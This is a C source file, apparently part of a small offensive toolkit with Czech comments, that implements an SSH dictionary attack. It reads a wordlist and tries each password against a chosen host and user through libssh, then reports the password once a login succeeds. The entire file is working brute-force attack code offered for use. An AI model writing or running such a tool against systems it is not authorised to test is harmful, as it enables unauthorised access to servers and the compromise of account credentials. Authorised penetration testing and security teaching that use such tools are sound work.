#include "sshPass.h"

void ssh_auth(char *host, char *user,char *password, int port, int counter);

int sshPass(int argc,char **argv) {
		FILE *fpin;

		char word[100],*passwd, *host, *user, *dict;       	
		int c, counter = 1;
                int port = 22;
                
		while ((c = getopt(argc, argv, "d:D:u:l:")) != -1) 
		{
			switch (c)
			{
			case 'd':
				host = optarg;
				break;
                        case 'D':
				port = atoi(optarg);
				break;
			case 'u':
				user = optarg;
				break;
			case 'l':
				dict = optarg;
				break;
			default:
				break; // zmenit na vypis napovedy
			}
		}

		if( ( fpin = fopen(dict,"r")) == NULL) { // pokus otevrit slovnik ("r" pouze pro cteni)
				fprintf(stderr,"[!] Can't Open dictionary file %s\n",dict);
		exit(1);
		}
		
		printf("\n*-------------------- SSH dictionary attack starts --------------------*\n"
                        "\nTrying to find password...\n"
                        "Username: %s\nDictionary: %s\n", user,dict);
		while( (fgets(word,100,fpin)) != NULL ) { // cte ze souboru slova o max 100 znacich a uklada do prom. word
				passwd = strchr(word,'\n'); // ulozi slovo ze slovniku oddelene enterem
				if(passwd) {
					*passwd = '\0';
				}
				ssh_auth(host,user,word,port,counter);
                                printf("\r[STATUS] %d passwords tried\t", counter);
				fflush(stdout);
				counter++;
 		}
		printf("[!] There is no password in the dictionary\n");
		fclose(fpin);
		exit(0);
}
void ssh_auth(char *host, char *user,char *password, int port, int counter) {
		ssh_session my_ssh_session;
		int rc;
		my_ssh_session = ssh_new();
		if(my_ssh_session == NULL) {
				exit(1);
		}
		ssh_options_set(my_ssh_session,SSH_OPTIONS_HOST,host);
		ssh_options_set(my_ssh_session,SSH_OPTIONS_PORT,&port);
		rc = ssh_connect(my_ssh_session);
		if(rc != SSH_OK) {
				fprintf(stderr,"[!] Error connecting to the server: %s\n",ssh_get_error(my_ssh_session));
				exit(1);
		}
		rc = ssh_userauth_password(my_ssh_session,user,password);
		if( rc != SSH_AUTH_SUCCESS) {
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
		}else{
				fprintf(stderr,"\n\n[SUCCESS] Password found: \"%s\"\n          %d passwords total tried.\n\n",password, counter);
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
				exit(0);
		}

}


